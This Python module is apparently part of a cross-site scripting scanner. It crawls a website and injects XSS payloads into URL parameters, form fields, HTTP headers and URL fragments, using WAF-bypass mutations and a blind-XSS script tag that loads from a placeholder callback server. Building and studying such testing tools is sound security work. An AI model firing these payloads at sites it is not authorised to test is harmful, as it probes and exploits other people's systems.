"""
XSS0r Integration Module

This module provides functionality similar to the XSS0r tool, integrating with
our CacheXSSDetector to provide advanced crawling, automated testing, and
comprehensive XSS vulnerability scanning capabilities.
"""

import re
import logging
import time
import random
import json
import urllib.parse
import requests
from typing import Dict, List, Set, Tuple, Optional, Any
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# For handling JavaScript content
try:
    from pyppeteer import launch
    HEADLESS_SUPPORT = True
except ImportError:
    HEADLESS_SUPPORT = False

class XSS0rIntegration:
    """
    XSS0r-like functionality for advanced XSS detection and testing.
    """
    
    def __init__(self, config: Optional[Dict] = None):
        """
        Initialize the XSS0r integration module.
        
        Args:
            config (dict, optional): Configuration settings.
        """
        self.logger = logging.getLogger('cachexssdetector.xss0r_integration')
        self.config = config or {}
        
        # Spider/crawler settings
        self.max_depth = self.config.get('max_depth', 3)
        self.max_urls_per_domain = self.config.get('max_urls_per_domain', 100)
        self.respect_robots_txt = self.config.get('respect_robots_txt', True)
        self.crawl_delay = self.config.get('crawl_delay', 1)  # seconds
        
        # Detection settings
        self.test_forms = self.config.get('test_forms', True)
        self.test_headers = self.config.get('test_headers', True)
        self.test_cookies = self.config.get('test_cookies', True)
        self.test_dom = self.config.get('test_dom', True)
        self.header_tests_per_url = self.config.get('header_tests_per_url', 3)  # Limit header tests to avoid excessive requests
        
        # Blind XSS settings
        self.blind_xss_enabled = self.config.get('blind_xss_enabled', False)
        self.callback_url = self.config.get('callback_url', 'https://your-callback-server.com/callback')
        
        # Request settings
        self.timeout = self.config.get('timeout', 10)
        self.user_agent = self.config.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')
        self.headers = self.config.get('headers', {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Initialize crawler state
        self.visited_urls: Set[str] = set()
        self.url_queue: List[Tuple[str, int]] = []  # (url, depth)
        self.forms_found: List[Dict] = []
        self.discovered_urls: List[str] = []
        
        # Detector references (to be set later)
        self.xss_detector = None
        self.waf_bypass = None
        
        self.logger.info("XSS0r Integration module initialized")
    
    def set_detectors(self, xss_detector, waf_bypass):
        """
        Set the detector modules to use for testing.
        
        Args:
            xss_detector: The XSS detector instance.
            waf_bypass: The WAF bypass instance.
        """
        self.xss_detector = xss_detector
        self.waf_bypass = waf_bypass
        
        # Initialize the custom header injector
        from .custom_header_injector import CustomHeaderInjector
        self.header_injector = CustomHeaderInjector()
    
    def crawl(self, start_url: str) -> Dict:
        """
        Crawl a website starting from the given URL.
        
        Args:
            start_url (str): The URL to start crawling from.
            
        Returns:
            dict: Crawl results including discovered URLs and forms.
        """
        self.logger.info(f"Starting crawl from {start_url}")
        
        # Reset state
        self.visited_urls = set()
        self.url_queue = [(start_url, 0)]  # (url, depth)
        self.forms_found = []
        self.discovered_urls = []
        
        # Process the URL queue
        while self.url_queue and len(self.visited_urls) < self.max_urls_per_domain:
            # Get the next URL to process
            current_url, depth = self.url_queue.pop(0)
            
            # Skip if we've already visited this URL or exceeded max depth
            if current_url in self.visited_urls or depth > self.max_depth:
                continue
            
            self.logger.info(f"Crawling URL: {current_url} (depth: {depth})")
            
            # Mark as visited
            self.visited_urls.add(current_url)
            self.discovered_urls.append(current_url)
            
            try:
                # Respect crawl delay
                time.sleep(self.crawl_delay)
                
                # Fetch the page
                response = requests.get(
                    current_url, 
                    headers=self.headers, 
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                # Skip non-successful responses or non-HTML content
                if response.status_code != 200 or 'text/html' not in response.headers.get('Content-Type', ''):
                    continue
                
                # Parse HTML with BeautifulSoup
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find and store forms
                if self.test_forms:
                    self._extract_forms(soup, current_url)
                
                # Extract links for further crawling if not at max depth
                if depth < self.max_depth:
                    next_depth = depth + 1
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        absolute_url = urljoin(current_url, href)
                        
                        # Only follow links to the same domain
                        if self._same_domain(absolute_url, start_url):
                            # Remove fragments
                            absolute_url = absolute_url.split('#')[0]
                            
                            # Add to queue if not visited
                            if absolute_url not in self.visited_urls:
                                self.url_queue.append((absolute_url, next_depth))
            
            except Exception as e:
                self.logger.error(f"Error crawling {current_url}: {str(e)}")
        
        # Prepare and return results
        results = {
            "start_url": start_url,
            "urls_discovered": len(self.discovered_urls),
            "forms_found": len(self.forms_found),
            "max_depth_reached": max(depth for _, depth in self.url_queue) if self.url_queue else 0,
            "discovered_urls": self.discovered_urls,
            "forms": self.forms_found
        }
        
        self.logger.info(f"Crawl complete. Discovered {len(self.discovered_urls)} URLs and {len(self.forms_found)} forms.")
        
        return results
    
    def _test_headers(self, url: str) -> Dict:
        """
        Test a URL for header-based XSS vulnerabilities.
        
        Args:
            url (str): The URL to test.
            
        Returns:
            dict: Test results.
        """
        if not hasattr(self, 'header_injector'):
            self.logger.warning("Header injector not initialized, skipping header tests")
            return {"url": url, "vulnerable": False, "tests": []}
        
        # Generate malicious headers for testing
        malicious_headers = self.header_injector.generate_malicious_headers(self.waf_bypass)
        
        # Limit the number of tests to avoid excessive requests
        test_headers = malicious_headers[:self.header_tests_per_url]
        
        results = {
            "url": url,
            "headers_tested": 0,
            "vulnerable": False,
            "successful_header": None,
            "successful_payload": None,
            "tests": []
        }
        
        # Test each malicious header set
        for header_set in test_headers:
            results["headers_tested"] += 1
            
            try:
                # Send the request with malicious headers
                response = requests.get(
                    url, 
                    headers=header_set['headers'], 
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                # Analyze header reflection
                reflection_analysis = self.header_injector.analyze_header_reflection(
                    response.text, 
                    header_set['payload']
                )
                
                # Use the XSS detector to analyze the response if available
                vulnerable = False
                if self.xss_detector:
                    analysis = self.xss_detector.analyze_response(url, {
                        'body': response.text,
                        'headers': dict(response.headers),
                        'status_code': response.status_code
                    })
                    
                    vulnerable = len(analysis.get('vulnerabilities', [])) > 0
                else:
                    # If no detector available, use reflection analysis as fallback
                    vulnerable = reflection_analysis.get('potentially_exploitable', False)
                
                test_result = {
                    "header": header_set['header_name'],
                    "payload": header_set['payload'],
                    "reflected": reflection_analysis.get('reflected', False),
                    "encoded_reflected": reflection_analysis.get('encoded_reflected', False),
                    "vulnerable": vulnerable
                }
                
                if 'technique' in header_set:
                    test_result["bypass_technique"] = header_set['technique']
                
                results["tests"].append(test_result)
                
                # If vulnerable, update the results
                if vulnerable:
                    results["vulnerable"] = True
                    results["successful_header"] = header_set['header_name']
                    results["successful_payload"] = header_set['payload']
                    
                    # No need to test more header sets
                    break
                
            except Exception as e:
                self.logger.error(f"Error testing header {header_set['header_name']} with payload: {str(e)}")
                results["tests"].append({
                    "header": header_set['header_name'],
                    "payload": header_set['payload'],
                    "error": str(e)
                })
        
        return results

    def scan_site(self, start_url: str) -> Dict:
        """
        Scan a website for XSS vulnerabilities.
        
        Args:
            start_url (str): The URL to start scanning from.
            
        Returns:
            dict: Scan results including vulnerabilities found.
        """
        if not self.xss_detector:
            raise ValueError("XSS detector not set. Call set_detectors() first.")
        
        self.logger.info(f"Starting XSS0r scan on {start_url}")
        
        # First crawl the site
        crawl_results = self.crawl(start_url)
        
        vulnerabilities = []
        scan_results = {
            "start_url": start_url,
            "urls_scanned": 0,
            "forms_tested": 0,
            "headers_tested": 0,
            "vulnerabilities_found": 0,
            "scan_details": []
        }
        
        # Test URL parameters
        self.logger.info("Testing URL parameters for XSS vulnerabilities")
        for url in crawl_results["discovered_urls"]:
            scan_results["urls_scanned"] += 1
            
            # Skip URLs without parameters
            parsed_url = urlparse(url)
            if not parsed_url.query:
                continue
            
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            for param_name, param_values in query_params.items():
                # Test each parameter with XSS payloads
                param_results = self._test_parameter(url, param_name)
                
                if param_results.get("vulnerable", False):
                    vulnerabilities.append(param_results)
                    scan_results["vulnerabilities_found"] += 1
                
                scan_results["scan_details"].append({
                    "url": url,
                    "parameter": param_name,
                    "test_type": "url_parameter",
                    "vulnerable": param_results.get("vulnerable", False),
                    "details": param_results
                })
        
        # Test forms
        if self.test_forms:
            self.logger.info("Testing forms for XSS vulnerabilities")
            for form in crawl_results["forms"]:
                scan_results["forms_tested"] += 1
                
                form_results = self._test_form(form)
                
                if form_results.get("vulnerable", False):
                    vulnerabilities.append(form_results)
                    scan_results["vulnerabilities_found"] += 1
                
                scan_results["scan_details"].append({
                    "url": form["action"],
                    "form_id": form.get("id", ""),
                    "test_type": "form",
                    "vulnerable": form_results.get("vulnerable", False),
                    "details": form_results
                })
        
        # Test HTTP Headers
        if self.test_headers:
            self.logger.info("Testing HTTP headers for XSS vulnerabilities")
            # Select a subset of URLs to test headers on to reduce test time
            header_test_urls = crawl_results["discovered_urls"][:5]  # Test first 5 URLs
            
            for url in header_test_urls:
                scan_results["headers_tested"] += 1
                
                header_results = self._test_headers(url)
                
                if header_results.get("vulnerable", False):
                    vulnerabilities.append(header_results)
                    scan_results["vulnerabilities_found"] += 1
                
                scan_results["scan_details"].append({
                    "url": url,
                    "test_type": "http_headers",
                    "vulnerable": header_results.get("vulnerable", False),
                    "details": header_results
                })
        
        # Test DOM-based XSS if enabled and supported
        if self.test_dom and HEADLESS_SUPPORT:
            self.logger.info("Testing for DOM-based XSS vulnerabilities")
            for url in crawl_results["discovered_urls"]:
                dom_results = self._test_dom_xss(url)
                
                if dom_results.get("vulnerable", False):
                    vulnerabilities.append(dom_results)
                    scan_results["vulnerabilities_found"] += 1
                
                scan_results["scan_details"].append({
                    "url": url,
                    "test_type": "dom_based",
                    "vulnerable": dom_results.get("vulnerable", False),
                    "details": dom_results
                })
        
        # Add vulnerabilities to the results
        scan_results["vulnerabilities"] = vulnerabilities
        
        self.logger.info(f"Scan complete. Found {scan_results['vulnerabilities_found']} vulnerabilities.")
        
        return scan_results
    
    def _extract_forms(self, soup: BeautifulSoup, page_url: str) -> None:
        """
        Extract forms from a page.
        
        Args:
            soup (BeautifulSoup): Parsed HTML.
            page_url (str): URL of the page.
        """
        forms = soup.find_all('form')
        
        for form in forms:
            form_info = {
                "page_url": page_url,
                "action": urljoin(page_url, form.get('action', '')),
                "method": form.get('method', 'get').lower(),
                "inputs": []
            }
            
            # Extract form attributes
            form_id = form.get('id', '')
            form_name = form.get('name', '')
            if form_id:
                form_info["id"] = form_id
            if form_name:
                form_info["name"] = form_name
            
            # Find all inputs
            inputs = form.find_all(['input', 'textarea', 'select'])
            
            for input_field in inputs:
                input_type = input_field.get('type', 'text')
                
                # Skip certain input types
                if input_type in ['submit', 'button', 'image', 'reset', 'file']:
                    continue
                
                input_info = {
                    "name": input_field.get('name', ''),
                    "type": input_type,
                    "id": input_field.get('id', ''),
                    "value": input_field.get('value', '')
                }
                
                form_info["inputs"].append(input_info)
            
            # Only include forms with at least one input
            if form_info["inputs"]:
                self.forms_found.append(form_info)
    
    def _test_parameter(self, url: str, param_name: str) -> Dict:
        """
        Test a URL parameter for XSS vulnerabilities.
        
        Args:
            url (str): The URL containing the parameter.
            param_name (str): The name of the parameter to test.
            
        Returns:
            dict: Test results.
        """
        # Extract the base URL and query parameters
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # Generate payloads
        payloads = []
        
        # Basic XSS payload
        basic_payload = "<script>alert('XSS')</script>"
        payloads.append(basic_payload)
        
        # Add WAF bypass payloads if available
        if self.waf_bypass:
            bypass_variations = self.waf_bypass.generate_waf_bypass_payloads(basic_payload, max_variations=3)
            payloads.extend([var['mutated'] for var in bypass_variations])
        
        # Add a blind XSS payload if enabled
        if self.blind_xss_enabled:
            blind_payload = f"<script src=\"{self.callback_url}?page={urllib.parse.quote(url)}&param={param_name}\"></script>"
            payloads.append(blind_payload)
        
        # Results structure
        results = {
            "url": url,
            "parameter": param_name,
            "payloads_tested": 0,
            "vulnerable": False,
            "successful_payload": None,
            "tests": []
        }
        
        # Test each payload
        for payload in payloads:
            results["payloads_tested"] += 1
            
            # Clone the original query parameters
            test_params = {k: v.copy() if isinstance(v, list) else v for k, v in query_params.items()}
            
            # Replace the target parameter with the payload
            test_params[param_name] = [payload]
            
            # Build the test URL
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = f"{base_url}?{test_query}"
            
            # Send the request
            try:
                response = requests.get(
                    test_url, 
                    headers=self.headers, 
                    timeout=self.timeout,
                    allow_redirects=True
                )
                
                # Check if the payload is reflected in the response
                reflected = payload in response.text
                
                # Use the XSS detector to analyze the response if available
                vulnerable = False
                if self.xss_detector:
                    analysis = self.xss_detector.analyze_response(test_url, {
                        'body': response.text,
                        'headers': dict(response.headers),
                        'status_code': response.status_code
                    })
                    
                    vulnerable = len(analysis.get('vulnerabilities', [])) > 0
                
                test_result = {
                    "payload": payload,
                    "reflected": reflected,
                    "vulnerable": vulnerable
                }
                
                results["tests"].append(test_result)
                
                # If vulnerable, update the results
                if vulnerable:
                    results["vulnerable"] = True
                    results["successful_payload"] = payload
                    
                    # No need to test more payloads if we found a vulnerability
                    break
                
            except Exception as e:
                self.logger.error(f"Error testing parameter {param_name} with payload: {str(e)}")
                results["tests"].append({
                    "payload": payload,
                    "error": str(e)
                })
        
        return results
    
    def _test_form(self, form: Dict) -> Dict:
        """
        Test a form for XSS vulnerabilities.
        
        Args:
            form (dict): Form information.
            
        Returns:
            dict: Test results.
        """
        form_url = form["action"]
        method = form["method"]
        
        # Generate payloads
        basic_payload = "<script>alert('XSS')</script>"
        payloads = [basic_payload]
        
        # Add WAF bypass payloads if available
        if self.waf_bypass:
            bypass_variations = self.waf_bypass.generate_waf_bypass_payloads(basic_payload, max_variations=3)
            payloads.extend([var['mutated'] for var in bypass_variations])
        
        # Results structure
        results = {
            "form_url": form_url,
            "method": method,
            "inputs_tested": 0,
            "vulnerable": False,
            "vulnerable_input": None,
            "successful_payload": None,
            "tests": []
        }
        
        # Test each input field with each payload
        for input_field in form["inputs"]:
            input_name = input_field["name"]
            if not input_name:
                continue
            
            results["inputs_tested"] += 1
            
            for payload in payloads:
                # Prepare form data
                form_data = {}
                
                # Fill in all form fields
                for field in form["inputs"]:
                    field_name = field["name"]
                    if field_name == input_name:
                        # Target field gets the payload
                        form_data[field_name] = payload
                    else:
                        # Other fields get default values
                        if field["type"] == "checkbox":
                            form_data[field_name] = "on"
                        elif field["type"] == "radio":
                            form_data[field_name] = field.get("value", "on")
                        else:
                            form_data[field_name] = field.get("value", "test")
                
                # Send the request
                try:
                    if method == "post":
                        response = requests.post(
                            form_url, 
                            data=form_data,
                            headers=self.headers, 
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                    else:
                        response = requests.get(
                            form_url, 
                            params=form_data,
                            headers=self.headers, 
                            timeout=self.timeout,
                            allow_redirects=True
                        )
                    
                    # Check if the payload is reflected in the response
                    reflected = payload in response.text
                    
                    # Use the XSS detector to analyze the response if available
                    vulnerable = False
                    if self.xss_detector:
                        analysis = self.xss_detector.analyze_response(form_url, {
                            'body': response.text,
                            'headers': dict(response.headers),
                            'status_code': response.status_code
                        })
                        
                        vulnerable = len(analysis.get('vulnerabilities', [])) > 0
                    
                    test_result = {
                        "input": input_name,
                        "payload": payload,
                        "reflected": reflected,
                        "vulnerable": vulnerable
                    }
                    
                    results["tests"].append(test_result)
                    
                    # If vulnerable, update the results
                    if vulnerable:
                        results["vulnerable"] = True
                        results["vulnerable_input"] = input_name
                        results["successful_payload"] = payload
                        
                        # No need to test more payloads for this input
                        break
                    
                except Exception as e:
                    self.logger.error(f"Error testing form input {input_name} with payload: {str(e)}")
                    results["tests"].append({
                        "input": input_name,
                        "payload": payload,
                        "error": str(e)
                    })
            
            # If we found a vulnerability, no need to test more inputs
            if results["vulnerable"]:
                break
        
        return results
    
    async def _test_dom_xss_internal(self, url: str, payload: str) -> Dict:
        """
        Test for DOM-based XSS vulnerabilities using headless browser.
        
        Args:
            url (str): The URL to test.
            payload (str): The XSS payload to test.
            
        Returns:
            dict: Test results.
        """
        results = {
            "payload": payload,
            "vulnerable": False,
            "error": None
        }
        
        try:
            # Launch a headless browser
            browser = await launch(headless=True)
            page = await browser.newPage()
            
            # Set up alert monitoring
            alert_triggered = False
            
            async def handle_dialog(dialog):
                nonlocal alert_triggered
                alert_triggered = True
                await dialog.dismiss()
            
            page.on('dialog', handle_dialog)
            
            # Prepare URL with payload
            test_url = url
            if "#" in url:
                test_url = url.split("#")[0] + "#" + payload
            elif "?" in url:
                test_url = url + "&xss=" + urllib.parse.quote(payload)
            else:
                test_url = url + "?xss=" + urllib.parse.quote(payload)
            
            # Navigate to the URL
            await page.goto(test_url, {"timeout": self.timeout * 1000, "waitUntil": "networkidle0"})
            
            # Check if alert was triggered
            if alert_triggered:
                results["vulnerable"] = True
            
            # Close the browser
            await browser.close()
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def _test_dom_xss(self, url: str) -> Dict:
        """
        Test for DOM-based XSS vulnerabilities.
        
        Args:
            url (str): The URL to test.
            
        Returns:
            dict: Test results.
        """
        import asyncio
        
        # Generate payloads
        payloads = [
            "alert('XSS')",
            "prompt('XSS')",
            "confirm('XSS')"
        ]
        
        results = {
            "url": url,
            "payloads_tested": 0,
            "vulnerable": False,
            "successful_payload": None,
            "tests": []
        }
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Test each payload
        for payload in payloads:
            results["payloads_tested"] += 1
            
            test_result = loop.run_until_complete(
                self._test_dom_xss_internal(url, payload)
            )
            
            results["tests"].append(test_result)
            
            # If vulnerable, update the results
            if test_result.get("vulnerable", False):
                results["vulnerable"] = True
                results["successful_payload"] = payload
                
                # No need to test more payloads
                break
        
        loop.close()
        
        return results
    
    def _same_domain(self, url1: str, url2: str) -> bool:
        """
        Check if two URLs have the same domain.
        
        Args:
            url1 (str): First URL.
            url2 (str): Second URL.
            
        Returns:
            bool: True if the domains match, False otherwise.
        """
        domain1 = urlparse(url1).netloc
        domain2 = urlparse(url2).netloc
        
        # Handle www. prefixes
        domain1 = domain1.replace('www.', '')
        domain2 = domain2.replace('www.', '')
        
        return domain1 == domain2
